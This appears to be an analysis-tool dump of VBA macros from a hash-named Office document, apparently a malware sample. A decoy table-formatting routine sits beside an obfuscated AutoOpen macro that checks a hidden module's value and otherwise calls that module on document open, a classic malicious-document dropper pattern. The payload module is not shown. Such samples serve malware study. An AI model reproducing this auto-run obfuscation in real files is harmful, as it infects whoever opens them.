@@ -1,0 +1,50 @@
+Filename     : ./macros/0f879a7a9e2d855c7456f506e0297d9ec9b676ac6c27aa99ecfed4738e028836
+OLE stream   : Macros/VBA/Document
+VBA filename : Document.cls
+----------------------------------------
+Attribute VB_Name = "Document"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub FormatTablesSelect()
+Dim oTb As Table
+For Each oTb In ActiveDocument.Tables
+    Select Case oTb.Style
+        Case "Light Shading - Accent 4"
+            oTb.AutoFitBehavior (wdAutoFitFixed)
+            oTb.Rows.Alignment = wdAlignRowCenter
+            oTb.Columns.PreferredWidth = InchesToPoints(0.6)
+        Case "Medium List 2 - Accent 4"
+            oTb.AutoFitBehavior (wdAutoFitWindow)
+            oTb.Rows.Alignment = wdAlignRowLeft
+        Case "Table Grid", "Table Normal"
+            oTb.Style = "Light Grid - Accent 4"
+        Case Else
+            oTb.Style = "Medium List 1 - Accent 4"
+        End Select
+Next oTb
+End Sub
+
+Public Sub AutoOpen()
+Dim topmast As String
+Dim mignonette As Integer
+Dim canny As Long
+mignonette = irena.pipefish
+
+If mignonette = 84 - 29 + 26424 Then
+FormatTablesSelect
+Else
+caprice = 84 - 75
+odds = 62 - 28 + 30
+For caprice = 84 - 75 To 62 - 28 + 30
+person = Right("eisenhowerda", 2) + "rn"
+Next caprice
+
+irena.hagridden
+End If
+End Sub
+
